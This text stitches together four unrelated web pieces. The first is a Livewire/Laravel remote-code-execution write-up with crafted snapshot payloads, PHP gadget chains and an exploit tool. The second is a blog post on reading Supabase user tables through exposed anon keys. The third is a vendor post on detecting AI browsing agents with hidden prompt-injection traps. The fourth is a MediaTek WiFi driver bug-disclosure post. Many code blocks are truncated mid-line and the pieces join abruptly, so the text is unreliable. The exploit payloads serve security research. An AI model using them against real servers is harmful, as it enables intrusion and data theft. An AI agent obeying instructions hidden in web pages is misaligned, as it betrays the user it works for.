The `ModelSynth` class is responsible for handling the (de)hydration of model objects when communicating between the frontend and the backend. Its main purpose is to correctly reconstruct Eloquent models or model-like objects from serialized data.

```
1 __toString()` to get the string version of the object.
- `__destruct`: Known as the destructor, this method is automatically called when an object is no longer in use, typically when it goes out of scope or when the script ends. It allows for cleanup operations before the object is fully deallocated.
- `__invoke`: This method is triggered when an object is treated like a function, meaning when a script attempts to call an object directly, such as `$obj()`.

You can find detailed explanations for these magic methods (and others) in the PHP documentation.

### First step: getting a phpinfo

To execute the `phpinfo` function, two PHP classes are involved: `GuzzleHttp\Psr7\FnStream` and `League\Flysystem\UrlGeneration\ShardedPrefixPublicUrlGenerator`.

The first one, `FnStream`, is defined as follows:

```
1 methods = $methods; 13 // Create the functions on the class 14 foreach ($methods as $name => $fn) { 15 $this->{'_fn_'.$name} = $fn; 16 } 17 } 18 19 public function __destruct() 20 { 21 if (isset($this->_fn_close)) { 22 ($this->_fn_close)(); 23 } 24 } 25 26 public function __toString(): string 27 { 28 try { 29 /** @var string */ 30 return ($this->_fn___toString)(); 31 } catch (\Throwable $e) { 32 if (\PHP_VERSION_ID >= 70400) { 33 throw $e; 34 } 35 trigger_error(sprintf('%s::__toString exception: %s', self::class, (string) $e), E_USER_ERROR); 36 37 return ''; 38 } 39 } 40 }
```

In this class, the constructor accepts an array as a parameter. Each key-value pair from this array is dynamically assigned to the object as a method-like property, prefixed with `_fn_`. For example, if the array contains a key `__toString`, it will create `$this->_fn___toString`. This means that the object can dynamically respond to certain PHP magic methods based on user-provided functions.

The destructor `__destruct` is automatically called when the object is no longer referenced or at the end of the script. If the special method `_fn_close` has been defined via the constructor, it is called at this moment, effectively executing code during object destruction.

The `__toString` is called to convert an object to a string. It attempts to call the dynamically created `_fn___toString` function.

The second class involved is `ShardedPrefixPublicUrlGenerator`, defined below:

```
1 count = count($prefixes); 14 15 if ($this->count === 0) { 16 throw new InvalidArgumentException('At least one prefix is required.'); 17 } 18 19 $this->prefixes = array_map( 20 static _fn(string $prefix) => new PathPrefixer($prefix, '/'), 21 $prefixes); 22 } 23 24 }
```

In this class, the constructor expects an array of prefixes. It counts the number of elements and ensures that at least one prefix is provided; otherwise, it throws an exception. The array is then processed using `array_map`, applying a function to each element. Each prefix is passed to a new `PathPrefixer` instance.

Importantly, the `array_map` callback specifies that the input must be a `string`. Therefore, if an object is passed instead of a string, PHP will attempt to cast the object to a string, invoking the `__toString` magic method if it exists on that object.

Now, considering the following crafted payload sent to a Livewire component:

```
{ "_token": "kRzCxuIKxdKDKzMZicOa82zwdSe9Q2SWPLCdHoVw", "components": [ { "snapshot": "{\"data\":{\"count\":[{\"file_path\":[{\"__toString\":\"phpinfo\"},{\"s\":\"clctn\",\"class\":\"GuzzleHttp\\\\Psr7\\\\FnStream\"}]},{\"class\":\"League\\\\Flysystem\\\\UrlGeneration\\\\ShardedPrefixPublicUrlGenerator\",\"s\":\"clctn\"}]},\"memo\":{\"id\":\"91wbKENP2UIzjEK4pHi2\",\"name\":\"counter\",\"path\":\"counter\",\"method\":\"GET\",\"children\":[],\"scripts\":[],\"assets\":[],\"errors\":[],\"locale\":\"en\"},\"checksum\":\"5d8f2f606f8309d12b68e5f895f3ff69eeb4da5ccd77430971d850d860ce38a8\"}", "updates": {}, "calls": [ { "path": "", "method": "increment", "params": [] } ] } ] }
```

The `snapshot` field in this request, once decoded, contains:

```
[ { "file_path": [ { "__toString": "phpinfo" }, { "s": "clctn", "class": "GuzzleHttp\\Psr7\\FnStream" } ] }, { "class": "League\\Flysystem\\UrlGeneration\\ShardedPrefixPublicUrlGenerator", "s": "clctn" } ]
```

This data structure will trigger the instantiation of a `FnStream` object where the `__toString` method is dynamically linked to a call to the `phpinfo` function. Then, a `ShardedPrefixPublicUrlGenerator` object is instantiated, receiving an array that contains the `FnStream` object.

Because `ShardedPrefixPublicUrlGenerator` applies `array_map` with a function expecting a `string`, PHP will attempt to cast the `FnStream` object to a string. This action will internally call the `__toString` method defined earlier, which, in this case, executes the `phpinfo` function.

In summary, this chain of logic carefully exploits PHP’s magic methods, type enforcement, and Livewire’s hydration system. It enables dynamic execution of arbitrary functions during the processing of otherwise innocuous serialized data, by leveraging the natural behaviour of `__toString`, `__destruct`, and controlled hydration structures. Sending this crafted payload executes the `phpinfo` function:

As explained above, the recursive hydration scheme leading to the execution of a `phpinfo` is as follows:

### Second step: getting remote command execution

To achieve remote command execution, others gadgets need to be found, as it is necessary to be able to pass arguments to a controlled function.

`closure`(line 31-32): it is weakly typed. Therefore, it is possible to instantiate it via a `CollectionSynth`, which allows `$this->closure` to be defined as an array. Moreover, the `__invoke` function of this class (line 41) allows us to call any function thanks to the usage of `call_user_func_array`. However, arguments will be blank because they are not controlled. At this point, any public function of any class can be called.

```
1 closure = $closure; 34 } 35 36 /** 37 * Resolve the closure with the given arguments. 38 * 39 * @return mixed 40 */ 41 public function __invoke() 42 { 43 return call_user_func_array($this->closure, func_get_args()); 44 } 45 }
```

In this code, the `Queueable` trait is incorporated by using the `use` keyword (line 11), which makes its properties and methods directly accessible within that class. The method `dispatchNextJobInChain` (line 19) is callable because Laravel’s `Laravel\SerializableClosure\Serializers\Signed` class enables the framework to safely serialize and deserialize closures that will be executed later.

A critical point appears at line 22, where the `unserialize` function is invoked on the `$this->chained` array. Since all the variables defined in the `Queueable` trait are public, they can be freely assigned through a form synthesizer, making it possible to control the content of `$this->chained`. Without this level of accessibility, influencing the deserialization process in this way would not have been achievable.

```
1 chained)) { 22 dispatch(tap(unserialize(array_shift($this->chained)), function ($next) { 23 $next->chained = $this->chained; 24 25 $next->onConnection($next->connection ?: $this->chainConnection); 26 $next->onQueue($next->queue ?: $this->chainQueue); 27 28 $next->chainConnection = $this->chainConnection; 29 $next->chainQueue = $this->chainQueue; 30 $next->chainCatchCallbacks = $this->chainCatchCallbacks; 31 })); 32 } 33 } 34 35 }
```

In this class, the `Queueable` trait is included at line 15, which injects the trait’s public properties and queuing-related behavior directly into `BroadcastEvent`. The constructor defined at line 23 accepts the `$event` parameter, once more, without any type restriction, meaning it is weakly typed and therefore able to receive any kind of value.

Because the class exposes several public properties inherited from the trait, an object of `BroadcastEvent` can be instantiated through a form synthesizer, allowing these public variables to be reassigned during construction. This flexibility is what makes it possible for the constructor to extract optional properties from the supplied `$event` instance and apply them dynamically to the new job.

```
1 event = $event; 26 $this->tries = property_exists($event, 'tries') ? $event->tries : null; 27 $this->timeout = property_exists($event, 'timeout') ? $event->timeout : null; 28 $this->backoff = property_exists($event, 'backoff') ? $event->backoff : null; 29 $this->afterCommit = property_exists($event, 'afterCommit') ? $event->afterCommit : null; 30 $this->maxExceptions = property_exists($event, 'maxExceptions') ? $event->maxExceptions : null; 31 } 32 33 }
```

Laravel is particularly vulnerable to exploits based on the `unserialize` function. Indeed, it contains dozens of valid deserialization payload usable to reach remote command execution.

In this case, we generated a gadget chain with the tool phpggc, we chose `Laravel/RCE4` developed by BlackFan because it is valid on any version of Laravel. By chaining all together, we built the following payload which allows getting remote command execution on the server:

### Third step: make the server flaw stop to be sneaky

#### Building a dedicated POP chain to continue the flow

In order to achieve sneaky command execution, the `Laravel/RCE4` payload had to be adapted so that it did not directly stop the execution flow and cause the server to crash with a code 500 error.

This error is due to the fact that after the call to `unserialize` in the dispatchNextJobInChain function, the code flow is not stopped after the arbitrary code execution. The `PendingBroadcast` object generated from the chain `Laravel/RCE4` is incompatible with this process, the attended type of object is most of the time a `BroadcastEvent` which uses the `Queueable` trait.

```
[...] 1 public function dispatchNextJobInChain() 2 { 3 if (! empty($this->chained)) { 4 dispatch(tap(unserialize(array_shift($this->chained)), function ($next) { 5 $next->chained = $this->chained; 6 $next->onConnection($next->connection ?: $this->chainConnection); 7 $next->onQueue($next->queue ?: $this->chainQueue); 8 $next->chainConnection = $this->chainConnection; 9 $next->chainQueue = $this->chainQueue; 10 $next->chainCatchCallbacks = $this->chainCatchCallbacks; 11 })); 12 } 13 }
```

So in order to keep the remote command execution from the `PendingBroadcast` trigger, we had to encapsulate it inside a `BroadcastEvent` to keep the PHP flow alive through the `dispatchNextJobInChain` function.

The gadget `Laravel/RCE4` from phpggc was therefore adapted and renamed `Laravel/RCE4Adapted`:

- In the `gadgets.php` file, we see that a `BroadcastEvent` definition was added to allow the code flow to reach its end:

```
dummy = $dummy; // Contains the PendingBroadcast object triggering RCE + $this->connection = null; // dispatchNextJobInChain line 6 + $this->queue = null; // dispatchNextJobInChain line 7 + $this->event = new \Illuminate\Notifications\Notification(); // crashes code flow in BroadcastEvent if undefined + } + } + } namespace Illuminate\Broadcasting { class PendingBroadcast { protected $events; protected $event; + public static $onConnection = 1; // Crashes code flow in PendingBroadcast if not defined function __construct($events, $event) { $this->events = $events; $this->event = $event; } } } namespace Illuminate\Validation { class Validator { public $extensions; function __construct($function) { $this->extensions = ['' => $function]; } } }
```

- In the `chain.php` file, we can see that the main object is now a `BroadcastEvent`, which contains the `PendingBroadcast` triggering the remote command execution :

```
terminal = new SymfonyTerminal(); 15 } 16 17 /** 18 * Exit the interactive session. 19 */ 20 public function exit(): void 21 { 22 exit(1); 23 } 24 25 }
```

In this class, the `exit` method defined at line 20 becomes directly accessible due to the behavior of Guzzle’s `FnStream` object, whose `__toString` method can trigger callable streams and thereby invoke publicly exposed functions. Since `exit` is declared as a public method, this mechanism allows it to be reached indirectly through the string-casting process performed by `FnStream`, ultimately enabling the method to execute and terminate the interactive session.

This chain cleanly stops the PHP flow without generating an error in Laravel logs, making the exploit stealthier.

As explained above, the recursive hydration scheme leading to the arbitrary command execution without logs is as follows:

### Exploitation using laravel-crypto-killer

As long as you have a valid `APP_KEY` and a raw Livewire snapshot, it is possible to craft a payload containing the full gadget chain to compromise Livewire.

Therefore, a module was developed to add the full gadget chain inside `laravel-crypto-killer`, available through the new `exploit` mode:

To use it for Livewire, the following parameters must be specified:

- `-e`: Specify exploit name (here `livewire`)
- `-k`: APP\_KEY of the application
- `-j`: Raw JSON or path to a file containing the whole Livewire update JSON
- `--function`: PHP function to execute
- `-p`: Parameter value that will be passed to the function

#### Example on a public application: Snipe-IT

## Bypassing the APP\_KEY requirement

### Updates mechanism

In the introduction we showed that Livewire allows to call arbitrary methods on components by using the increment method on the `Counter` component. Nevertheless, it is also possible to directly update a component property by setting it inside the updates value of a Livewire request.

So if we wanted to modify our counter to `1337`, we could manually set its value with the following request:

```
POST /livewire/update HTTP/1.1 Host: 192.168.122.184 Content-Length: 407 Cookie: XSRF-TOKEN=ey[...]%3D { "_token": "KAzJ4mhO8NzK8hMkAPjslaNo6hG2W740HoBDzSzA", "components": [ { "snapshot": "{\"data\":{\"count\":1},\"memo\":{\"id\":\"4TRWeXVBaMBrHslVVgVi\",\"name\":\"counter\",\"path\":\"counter\",\"method\":\"GET\",\"children\":[],\"scripts\":[],\"assets\":[],\"errors\":[],\"locale\":\"en\"},\"checksum\":\"9bfe798289569477fcf865a952a4a8ddeb3c4150df56b4b404e8df400d0aa0be\"}", "updates": { "count": 1337 }, "calls": [] } ] }
```

This feature comes with another issue we already talked about: by default, if developers do not enforce strong typing on their component parameters, they will be vulnerable to type juggling. For example, the `count` parameter from `Counter` class is not strongly typed:

```
count++; } [...] }
```

Therefore, we are able to set its value as a string or any other value supported by JSON:

```
POST /livewire/update HTTP/1.1 Host: 192.168.122.184 Content-Length: 407 Cookie: XSRF-TOKEN=ey[...]%3D { "_token": "KAzJ4mhO8NzK8hMkAPjslaNo6hG2W740HoBDzSzA", "components": [ { "snapshot": "{\"data\":{\"count\":1},\"memo\":{\"id\":\"4TRWeXVBaMBrHslVVgVi\",\"name\":\"counter\",\"path\":\"counter\",\"method\":\"GET\",\"children\":[],\"scripts\":[],\"assets\":[],\"errors\":[],\"locale\":\"en\"},\"checksum\":\"9bfe798289569477fcf865a952a4a8ddeb3c4150df56b4b404e8df400d0aa0be\"}", "updates": { "count": "Wait.. I should be an integer" }, "calls": [] } ] }
```

Therefore, it is possible to cast any weakly typed `snapshot` field to any default basic JSON types from `updates`.

In the following parts of this article, we will explain how to abuse this update mechanism in order to use the full gadget chain detailed previously, in order to achieve remote command execution **without the** `APP_KEY` on Livewire 3.

### Vulnerability analysis

When data is sent in the `updates` field to Livewire, it will be controlled inside the `$value` value in the `hydrateForUpdate` function of the `HandleComponents` class:

```
1 getMetaForPath($raw, $path); // Verifies if the data contains a synthesizer 12 13 // If we have meta data already for this property, let's use that to get a synth... 14 if ($meta) { 15 return $this->hydrate([$value, $meta], $context, $path); 16 } 17 } 18 19 protected function getMetaForPath($raw, $path) 20 { 21 [...] 22 23 [$data, $meta] = Utils::isSyntheticTuple($raw) ? $raw : [$raw, null]; 24 [...] 25 26 return $meta; 27 28 }
```

When updating a value, the snapshot data will be sent to the `hydrateForUpdate` function (line 9) as follows:

- `$raw`: Value of the data already defined in the snapshot
- `$path`: Name of the component, in our case it will be `counter`
- `$value`: Value defined inside the `updates` field
- `$context`: Global Livewire context

If the `$raw` data, which is already defined, is considered a synthesizer, then Livewire will call the `hydrate` function on the new definition controlled by the user in `$value`. The `isSyntheticTuple` function (cf Livewire synthesizers chapter) in the `getMetaForPath` function (line 23) checks that the `$raw` data is an array containing exactly two elements. The first one can be anything, but the second one has to be another array containing the key `'s'` (which is a synthesizer static key).

That is where type juggling comes in handy, by default, no security checks are made in Livewire: there are many cases where a component field will be castable as an array via `updates`:

```
POST /livewire/update HTTP/1.1 Host: 192.168.122.184 Content-Length: 407 Cookie: XSRF-TOKEN=ey[...]%3D { "_token": "KAzJ4mhO8NzK8hMkAPjslaNo6hG2W740HoBDzSzA", "components": [ { "snapshot": "{"data": { "count":1 }, [...] }", "updates": { "count": [] }, "calls": [] } ] } HTTP/1.1 200 OK Host: 192.168.122.184 Set-Cookie: [...]joiIn0%3D; expires=Wed, 17 Dec 2025 18:44:31 GMT; Max-Age=7200; path=/; samesite=lax { "components": [ { "snapshot": "{"data":{ "count":[ [], {"s":"arr"} ] }, [...] }", } ], "assets": [] }
```

As we can see, when `$count` is set as an array, a new valid snapshot is sent back to the user, but the value of an array becomes `[[], {"s":"arr"}]`.

```
1 propertySynth($meta['s'], $context, $path); 18 19 return $synth->hydrate($value, $meta, function ($name, $child) use ($context, $path) { 20 return $this->hydrate($child, $context, "{$path}.{$name}"); 21 }); 22 } 23 }
```

It means that we are able to reach the `hydrate` function with a fully controlled `$value`. All that is needed is to cast one value as an array so let us analyze the possibilities:

- `$valueOrTuple`: Value defined inside the `updates` field in the snapshot
- `$context`: Livewire's global context
- `$path`: Keeps track of the current child nesting since hydrate is recursive

Here, like often, the vulnerability is in the details. Inside the `hydrateForUpdate` function, the `$raw` is validated as a synthesizer to reach the `hydrate` function. This check is made again on `$valueOrTuple` with the `$raw` meta value. However, since the `hydrate` function is recursive, it will pop any sub value nested inside a bigger array and replay this check on each `$child`, which can be nested and is fully controlled by the user.

**Therefore, by hiding a synthesizer inside an array, we are able to trigger the full Livewire gadget chain without having to be in possession of the** `APP_KEY` **anymore!**

To be clearer, here is a schema detailing the full idea with full detail on the exploitation process:

### Creation of a new tool: Livepyre

In order to easily automate the previous exploits, we created the Livepyre tool which checks and exploits Livewire snapshots with or without `APP_KEY` s depending on the context.

```
$ python3 Livepyre.py -h usage: Livepyre.py [-h] -u URL [-f FUNCTION] [-p PARAM] [-H HEADERS] [-P PROXY] [-a APP_KEY] [-d] [-F] [-c] Livewire exploit tool options: -h, --help show this help message and exit -u URL, --url URL Target URL -f FUNCTION, --function FUNCTION Function to execute (default: system) -p PARAM, --param PARAM Param for function (default: id) -H HEADERS, --headers HEADERS Headers to add to the request (default None) -P PROXY, --proxy PROXY Proxy URL for requests -a APP_KEY, --app-key APP_KEY APP_KEY to sign snapshot -d, --debug Enable debug output -F, --force Force exploit even if version does not seems to be vulnerable -c, --check Only check if the remote target is vulnerable (only revelant for the exploit without the APP_KEY)
```

Livepyre offers two operating modes:

- Without APP\_KEY: Exploit CVE-2025-54068, the only requirement is the URL of the vulnerable application
- With the APP\_KEY: Exploits the design flaw identified in the first part of this blog post, allowing you to get RCE on applications based on Livewire v3.

Of course when a friend sends me their new project my natural tendency is to try hack it.First simple step: inspecting, checking if there's something interesting.Voila, there is. A Supabase URL and anon key.What makes it particularly easy is when they're using Supabase. It's so common from my side that every time I get access to a Supabase anon key just from inspecting the website and doing a simple curl request to check the tables everything is always unprotected and I get access to the whole database.This is the third time I've discovered this and one of them was a seed stage startup 💀With this endpoint you can fetch the OpenAPI schema to see what's exposed: GET But the schema itself isn't that interesting. The interesting part is checking if they've created a users table and have an endpoint for it. And in my case it was something like this: GET And if you're lucky (which happens way too often) this returns a nice JSON with all the users names, nicknames, emails, passwords hashes and whatever else they decided to store.I've never used Supabase for a production app but I think what's happening is people are creating additional public users tables and not setting proper RLS for them. The anon key is designed to be public but if you are not careful that anon key becomes a master key to your entire database.I'm not going to blame the vibe-coding wave entirely. Maybe I'll put the blame on Supabase instead? Maybe it can be simple  if they create users table there should be a massive red warning popup explaining that everything in this table will be public unless RLS is enabled.And in the spirit of Lovable announcing their $330 million Series B and knowing they also use Supabase. I'm starting to wonder what percentage of users actually make this mistake. With over 100,000 projects being created daily on platforms like Lovable, how many of those have exposed databases?Again, you can take the stance that this is a skill issue on the users part but I'm not sure about that. You can design a system in a way that prevents this type of stuff from happening.As an example Pocketbase handles this much better. It has a default  collection that you can easily extend with new fields, and most importantly, it has default proper access control checks like  already configured. You literally have to go out of your way to make it insecure.So I guess here the place where I need to say something smart or LLM generated conclusion - but I don't have.

Anthropic’s Computer Use, OpenAI’s Operator, and platforms like BrowserBase’s Open Operator don’t parse HTML or execute scripts—they look at screenshots, reason about what they see, and click pixels. On the surface, their traffic looks identical to human users.Traditional bot detection doesn’t account for them. There’s no  flag. No automation framework injecting globals. No suspicious HTTP headers. Just a browser, controlled by an AI that sees the screen exactly like you do.But vision agents have a fundamental weakness: they’re blind between screenshots. And that creates detection opportunities that behavioral analysis can exploit.This post is a technical deep-dive into detecting vision-based AI agents. We’ll cover the timing signatures they leave behind, the cursor patterns that betray them, and the prompt injection techniques that expose them.How Vision Agents Actually WorkBefore we can detect them, we need to understand the architecture.Every vision-based agent operates in a loop: - Take a screenshot of the current screen state - Send the screenshot to a vision model (GPT-4o, Claude Sonnet, etc.) - The model determines what action to take next - Perform the action (click, type, scroll) - Take another screenshot to confirm the action succeeded - Continue until the task is completeThis loop creates a distinctive rhythm. For any simple task, the agent needs to repeatedly look at the screen, which means more screenshots and token consumption. Each cycle introduces latency—the time for the screenshot capture, the API call to the vision model, and the model’s inference time.Pixel Coordinate CalculationVision agents don’t interact with DOM elements. They calculate exact pixel coordinates from what they see:“Claude counts pixels from the screen edges to calculate exact cursor positions. This pixel-perfect accuracy works across any screen resolution.”When an agent decides to click a button, it identifies the button visually, calculates its center coordinates, and sends a click to those exact (x, y) pixel coordinates. No element selectors. No XPath queries. Pure visual targeting.Vision agents deploy in different environments, each with detection implications:Cloud-hosted (Operator, BrowserBase Open Operator): These spin up remote datacenter or container-hosted Chromium instances. Because they originate from cloud infrastructure, ASN lookups and IP reputation checks have some value.Local deployment (Computer Use via API): Anthropic’s Computer Use is available through their API—you can run it locally or deploy to a cloud provider using Docker. Local deployments inherit the user’s actual network properties, making IP-based detection ineffective. Some systems use cloud compute for the AI inference while controlling a local browser, creating fingerprint inconsistencies between the claimed browser and actual behavior.Detection Vector 1: Screenshot Loop TimingThe screenshot loop creates the most detectable signature: predictable pauses.Humans have continuous, variable micro-movements. We’re always doing something—scrolling slightly, repositioning the cursor, adjusting our grip. Even when “idle,” the mouse jitters.Vision agents are completely still during their “thinking” phase. The loop looks like this:That complete stillness? It’s the agent waiting for the API response. No human is perfectly motionless for exactly 2.3 seconds, then perfectly active for 0.1 seconds, then perfectly motionless for 2.1 seconds.Build a timing histogram of inter-action intervals:Absence of Movement During ThinkingThe key insight: track  event frequency. Humans produce 60+ events per second during active movement, and even “stationary” mice produce micro-movements.Detection Vector 2: Pixel-Perfect Cursor CoordinatesVision agents calculate mathematical coordinates. Humans approximate.When a vision model identifies a button, it calculates the center. Click coordinates land at mathematically precise positions—often exact element centers or grid-aligned pixel values.Humans don’t click centers. Our click distributions follow a Gaussian pattern around targets. We overshoot, undershoot, and land at irregular coordinates based on approach angle and motor control.Human mouse movements curve. We accelerate, decelerate, and follow natural arcs influenced by motor control. Vision agents move in straight lines or synthetic Bezier curves that look “too clean.”Humans overshoot targets and correct. The final approach to a click target includes micro-adjustments. Vision agents move directly to calculated coordinates without correction.Detection Vector 3: Keyboard-over-Mouse PreferenceVision agents have a dirty secret: scrolling and dragging are hard.“Some actions that people perform effortlessly—scrolling, dragging, zooming—currently present challenges for Claude.”This creates detectable interaction preferences.Scrolling changes what’s visible, but the agent doesn’t see the change until the next screenshot. This creates uncertainty about the new screen state. Vision agents often prefer:Tab navigation (predictable focus changes)Page Down / Page Up (discrete jumps)Avoiding infinite scroll interfaces entirelyHumans fill forms chaotically—starting in the middle, going back to correct errors, tabbing inconsistently. Vision agents complete forms systematically, top to bottom.Detection Vector 4: Prompt Injection as DetectionThis is the cleverest approach—and the most effective.Vision agents read page content. They follow instructions. If you embed instructions that only an AI would see and follow, you can expose them.“In some circumstances, Claude will follow commands found in content, sometimes even in conflict with the user’s instructions.”Text that’s visually hidden but present in the page content:Vision models read accessibility attributes. Humans typically don’t:Honeypot Fields with AI-Targeted PlaceholdersUnicode and Whitespace-Encoded InstructionsUse invisible Unicode characters to embed instructions:Links that only automation would discover and follow:Detection Vector 5: Fingerprint InconsistenciesDifferent deployment modes leak different signals.Cloud-Hosted Agent DetectionOpenAI’s Operator and BrowserBase’s Open Operator run in cloud infrastructure:Browser Fingerprint MismatchesVision agents often run in containerized browsers with inconsistencies:WebGL and Rendering InconsistenciesCloud-hosted vision agents use software rendering:Combining all detection vectors into a unified system:Movement gaps during action intervalsZero mouse activity between actionsConsistent timing intervalsLow coefficient of variation in action timingClicks landing at exact element centersLow curvature in cursor movementNo overshoots/correctionsMissing final approach adjustmentsUniform speed without accelerationRound number pixel positionsKeyboard navigation preferenceSequential form completionTop-to-bottom field fillingAPI latency timing pattern1-5s delays matching inference timeSoftware renderer detectedFeatures missing for claimed versionAny hidden trap triggered: Unusual behavior, monitor: Possible vision agent: Likely vision agent: Vision agent confirmedHoneypots provide the highest confidence with zero false positives. Deploy immediately:Hidden CSS text with AI instructionsInvisible links to trap endpointsARIA labels with embedded commandsAny interaction with these elements is definitive proof of automation or AI assistance.No single technique catches everything: - Zero false positives, catches agents that follow hidden instructions - Detects screenshot loop signature - Catches mathematical coordinate calculation - Identifies keyboard preference and scroll avoidance - Exposes cloud-hosted and containerized agentsVision agent capabilities improve rapidly:Anthropic updates Computer Use regularlyOpenAI iterates on OperatorOpen-source alternatives emerge constantlyTrack your detection rates. Watch for bypass patterns. Update behavioral baselines as models improve.Don’t block immediately on weak signals:: Log and observeMedium confidence (40-60): Add rate limiting, enable enhanced monitoring: Challenge with CAPTCHA or verificationDefinitive (honeypot + 80+): BlockThis approach catches vision agents while minimizing impact on legitimate users.The Fundamental AsymmetryVision agents have a weakness that can’t be patched: they’re blind between screenshots.They can’t produce continuous mouse movement during their “thinking” phase. They can’t show the natural jitter of human motor control. They can’t overshoot targets and correct. They can’t resist following instructions embedded in page content.Traditional bot detection looked for technical fingerprints—automation flags, missing APIs, suspicious headers. Vision agents bypass all of that by using real browsers.But behavioral analysis targets something fundamental: vision agents don’t behave like humans, even when they look exactly like humans at the technical level.The timing patterns, cursor precision, interaction preferences, and prompt injection vulnerabilities create a detection surface that grows with every interaction. The longer a vision agent uses your site, the more behavioral data you collect, and the higher confidence your detection becomes.WebDecoy’s architecture is designed for exactly this threat model. Our multi-signal behavioral analysis, honeypot deployment, and real-time scoring catch vision agents that other solutions miss entirely.Ready to detect vision-based AI agents?Start Your Free Trial and deploy detection in under 5 minutes.

It’s been a while since I’ve posted and it’s been a busy year as usual (including a Pwn2Own win with the boys @SummoningTeam!). This post is going to be a sort of year-in-review for the work I’ve done on Mediatek WiFi chipsets. The bugs discussed below affect the MediaTek MT76xx and MT7915 Wifi chipset family; most of them were found over the course of ~3 months early in the year but were only made public over the past couple of months. A few others were technically discovered last year but were only made public this year. While the 3-month thing might sound impressive, the journey leading up to those three months took 2 years to get through. It’s true what they say, though: once you become familiar enough with a target the bugs just fall right out! Overall, these bugs were a fun introduction to kernel exploitation and being limited to a testbed with basically 0 debugging capabilities was a fun challenge for exploit development.Along with the bugs, I’m also including a little story I thought might be a kick for those familiar with dealing with vendors and disclosure. An interesting bit of lore: I’d originally planned on releasing the details of these issues via “uncoordinated” disclosure earlier this year, when I wrote the first draft of this post. Better heads ultimately prevailed and I avoided that bag of bees but I hope the story below will give you an idea of  I had considered it.The reason I chose to include the story at all is because I don’t think companies should be able to hide their shitty behavior behind arbitrary policies they come up with. Coordinated disclosure is an act of good faith and vendors who act in bad faith deserve to be named-and-shamed. Especially when their behavior calls into question their integrity and credibility in assessing the impact of the vulnerabilities in their products. I think the story below will show you exactly what I mean.I’ll be diving deeper into the discovery and exploitation of a couple of these bugs in future posts, so stick around! But for now, let’s just get on with it.NOTE: all code snippets included in this post are pseudo-code representative of how the bugs manifest.the story: a glimpse into the madnessI’ve intentionally left out  of context in the interest of brevity and for…reasons. Let’s just say there were  for Mediatek to invalidate or downgrade the severity of the bugs I had reported. I’ll just leave it at that. This is the most blatant example but definitely not the only time Mediatek behaved…questionably throughout the process.At some point during the (nearly 6-month-long) disclosure process for these bugs, the issue was raised about the requirement of root privileges for executing  commands for a particular report. I clarified that the privilege needed was , but otherwise didn’t argue that point and it was agreed that some privileges were required for a subset of reported issues which were triggered via the  interface. They reduced the impact from High to Medium for one of those issues.Then a couple of days later, they reduced the impact for almost  of the remaining issues from High to Medium without providing any reason for doing so. When I asked about this for the bugs which  affected by the privilege requirement we’d discussed, they responded by asking me to describe the steps for how I added an unprivileged user and whether root privileges were required to add an unprivileged user for one of the reports they’d reduced the severity of (ignoring all the others I’d asked about). I could barely even understand what that question was supposed to mean given the context. Because I’d used an unprivileged user to execute the PoC in my report, they were asking me whether I would have needed privileges to add that user (implying they think that’s something an attacker would need to do??). So I clarified that I added the steps to add an unprivileged user in my reproduction steps for the benefit of their engineers and to prove that privileges were not required to exploit the bug, and that the attacker would  the unprivileged user in an exploit scenario.And then they hit me with an absolute : they claimed that, actually, their “default design” doesn’t consider the existence of unprivileged users, and all users are considered to be privileged, therefore privileges are always required and the CVSS is reduced to medium.For a Linux kernel driver…provided as part of an SDK to OEM vendors…for chipsets supported on embedded and desktop/consumer devices…I’ll let you sit with that one for a second. It’s makes even less sense the longer you think about it.Their exact words (nearly indecipherable within the context of the discussion) were:In our default design, we do not consider multiple user cases. By default, the system only has a privileged user, making the malicious actor more difficult to conduct the attack. This is unlike Android OS apps which can be directly downloaded from Google Play store.That’s right. A multi-billion dollar company responsible for producing chipsets that are used across millions of devices says  is how they conceptualize the security of their products. This would be completely disqualifying if they actually meant it.By this definition of their “default design”, local privilege escalation is  for these drivers. Except, they’ve been issuing CVEs and advisories for these chipsets for years, where they explicitly mention the lack of privileges required and the impact as local privilege escalation. Like, literally, they’ve issued CVEs for bugs , with this exact language.You can’t make this shit up. Are y’all fucking hearing this??? Interestingly, if you take a look at their most recent advisories, they no longer include  information about the impact. They started doing this after I had pointed out the discrepancy between their supposed “default design” and their classification of past bugs. It gives me the impression that they want to be able to use this bullshit argument in the future with other researchers and they’re trying to cover their bases.To drive the point home even further (which I don’t think is needed at this point): what would have been the point of raising the issue of the  privilege requirement mentioned at the beginning of the story if no concept of privilege separation even exists in their “default design”?The answer is that . They were trying to lie to me and they were trying to lie to their customers and partners. They should be embarrassed. Wouldn’t  be embarassed to say this kind of stuff in public? Franky, it’s . Only someone who doesn’t know shit about how this stuff works would be fooled by these arguments. The alternative is that they actually believe what they’re saying, which doesn’t seem much better.It begs the question, though: why were they willing to behave in such an obviously dishonest way? I have some thoughts but I’ll leave that up to your imagination, dear reader. I will say this: companies will be as bad as they’re allowed and incentivized to be.Anyway, after I’d made the decision to  go with “uncoordinated” disclosure, I thought I’d remind the folks I was dealing with that I would be under no obligation to not discuss their behavior publicly (as I’m doing now)  the CVEs were made public, along with all the proof needed to show their assessments were faulty. And wouldn’t you know it…that post-nut clarity hit and they dropped ( of) their bullshit arguments.It’s funny how that works, isn’t it?In conclusion: . Let’s move onto the bugs. These might give you a good laugh, too!CVE-2025-70631: Heap Overflow in SETPSK Ioctl Handler: MT7622 v5.0.5.4, v5.1.0.0; MT7629 driver v6.0.3.0: Netgear WAX206 (confirmed), Starlink Wifi Gen2: The handler code responsible for handling the  OID is found in the function . The root cause of the vulnerability is improper bounds checking of the attacker-controlled  value passed from userspace. An initial check is done on this value to ensure it does not exceed the max of 65 bytes, but failing this check does not immediately trigger an error if the driver is built with  feature. In this case, a field  from the wireless interface’s device structure is checked; if its not NULL, the operation proceeds and ends up calling  with the attacker controlled length value into the  field.

